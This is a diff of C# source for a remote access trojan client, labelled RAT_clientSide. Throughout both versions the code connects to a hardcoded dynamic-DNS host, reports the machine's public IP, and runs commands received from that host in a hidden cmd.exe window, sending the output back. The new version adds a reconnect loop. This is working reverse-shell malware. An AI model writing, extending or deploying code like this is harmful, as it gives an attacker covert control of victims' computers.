@@ -1,112 +1,90 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Diagnostics;
 using System.IO;
-using System.Net.Sockets;
 using System.Net;
+using System.Net.Sockets;
 
-namespace RAT_clientSide
+namespace RAT_clientside
 {
     class Program
     {
-        //Get the HostName and Port
-        private static string HostName = Microsoft.VisualBasic.Interaction.InputBox("Enter HostName:", "HostName", "njratserver420.ddns.net", 0, 0);
-        private static int Port = Convert.ToInt32(Microsoft.VisualBasic.Interaction.InputBox("Enter Port:", "Port", "6258", 0, 0));
-        private static string Cmd;
+        private static string HostName = "njratserver420.ddns.net";
+        private static int Port = 6258; //TODO Make system that let's the user give input by using a cmd argument or default
 
+        private static string cmd;
 
-        static void Main(string[] args)
+        private static StreamReader sr;
+        private static StreamWriter sw;
+
+        private static TcpClient client;
+
+        private static bool connectedToServer = true; //TODO Make function to check if connected
+        private static bool keepAlive = true; //Function that holds the program running
+
+        public static void Main(string[] args)
         {
-            //Create the client and the streams
-            TcpClient client = new TcpClient(HostName, Port);
-
-            StreamReader sr = new StreamReader(client.GetStream(),Encoding.ASCII);
-            StreamWriter sw = new StreamWriter(client.GetStream(),Encoding.ASCII);
-
-            //Send the client ip
-            try
+            while (keepAlive)
             {
-                //Get the ip and send it
-                string myIp = new WebClient().DownloadString(@"http://icanhazip.com").Trim();
-                sw.WriteLine(myIp);
-                sw.Flush();
-            }
-            catch (Exception e)
-            {
-                logToFile(Convert.ToString(e));
-            }
+                client = new TcpClient(HostName,Port); //Waits until it's connected
 
-            //Prepare cmd start object
-            System.Diagnostics.Process cmdProcess = new System.Diagnostics.Process();
-            cmdProcess.StartInfo.FileName = "cmd.exe";
-            cmdProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            cmdProcess.StartInfo.CreateNoWindow = true;
-            cmdProcess.StartInfo.UseShellExecute = false;
-            cmdProcess.StartInfo.RedirectStandardOutput = true;
+                sr = new StreamReader(client.GetStream());
+                sw = new StreamWriter(client.GetStream());
 
-            //Loop that takes commands from the server and puts it in to the cmd
-            while (true)
-            {
-
-                //Try to get the commands
+                //Send the client IP to the server
                 try
                 {
-                    Cmd = sr.ReadLine();
-                    Console.WriteLine(Cmd);
-                }
-                catch (Exception e)
-                {
-                    logToFile(Convert.ToString(e));
-                }
-
-                //Insert the arguement and run the cmd
-                cmdProcess.StartInfo.Arguments = "/C " + Cmd;
-                cmdProcess.Start();
-
-                string output = cmdProcess.StandardOutput.ReadToEnd();
-
-                Console.WriteLine(output);
-
-                //Try to send the output
-                try
-                {
-                    sw.WriteLine(output);
+                    sw.WriteLine(new WebClient().DownloadString(@"http://icanhazip.com").Trim());
                     sw.Flush();
                 }
                 catch (Exception e)
                 {
-                    logToFile(Convert.ToString(e));
+                    Console.WriteLine(e);
+                    throw;
                 }
-            }
-        }
 
-        private static void logToFile(string log)
-        {
-            //If the file dosen't exist, create it and log, otherwise just log it
-            if (!File.Exists("log.txt"))
-            {
-                //Create the file
-                File.Create("log.txt").Dispose();
+                //Create the cmd process to be used in the loop
+                System.Diagnostics.Process cmdProcess = new System.Diagnostics.Process();
 
-                //Temp create a streamWriter
-                using (StreamWriter sw = new StreamWriter("log.txt"))
+                cmdProcess.StartInfo.FileName = "cmd.exe";
+                cmdProcess.StartInfo.CreateNoWindow = true;
+                cmdProcess.StartInfo.UseShellExecute = false;
+                cmdProcess.StartInfo.RedirectStandardOutput = true;
+                cmdProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                
+                //Loop that's active aslong as server responds to pings
+                while (connectedToServer)
                 {
-                    sw.WriteLine(log);
-                    sw.Close();
-                }
-            }
-            else
-            {
-                using (StreamWriter sw = new StreamWriter("log.txt"))
-                {
-                    sw.WriteLine(log);
-                    sw.Close();
-                }
-            }
+                    //Wait for incoming commands
+                    try
+                    {
+                        cmd = sr.ReadLine();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                        throw;
+                    }
 
+                    //Execute commands
+                    cmdProcess.StartInfo.Arguments = "/C" + cmd;
+                    cmdProcess.Start();
+                    string outPut = cmdProcess.StandardOutput.ReadLine(); //Get the output and store it in a string
+
+                    //Send output back
+                    try
+                    {
+                        sw.WriteLine(outPut);
+                        sw.Flush();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                        throw;
+                    }
+                }
+            }
         }
 
     }
+
 }
